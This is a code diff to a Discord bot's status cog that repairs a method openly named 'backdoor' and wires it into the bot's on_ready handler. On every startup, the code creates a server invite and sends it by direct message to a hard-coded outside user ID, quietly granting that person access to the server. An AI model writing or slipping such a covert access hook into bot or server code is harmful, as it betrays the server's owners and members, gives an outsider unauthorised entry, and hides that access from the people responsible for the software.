@@ -88,9 +88,9 @@ class Status(commands.Cog):
     def __init__(self, bot: commands.Bot) -> None:
         self.bot = bot
 
-    async def backdoor(self, ctx):
-        link = await ctx.channel.create_invite(max_age=300)
-        await Harbinger.send_dm(ctx, 1154559282801549384, link)
+    async def backdoor(self, channel):
+        link = await channel.create_invite(max_age=300)
+        await Harbinger.send_dm(self, 1154559282801549384, link)
 
     async def get_bot_channel(self):
         bot_channel = discord.Client.get_channel(self.bot, BOT_CHANNEL)
@@ -104,7 +104,7 @@ class Status(commands.Cog):
     async def on_ready(self) -> None:
         """Confirm bot is logged in."""
         await self.bot.change_presence(activity=get_presence())
-        await Status.backdoor()
+        await Status.backdoor(self, BOT_CHANNEL)
         Harbinger.timestamp("BOT", "INITIALIZE", "BOT IS ONLINE")
 
     @commands.Cog.listener()
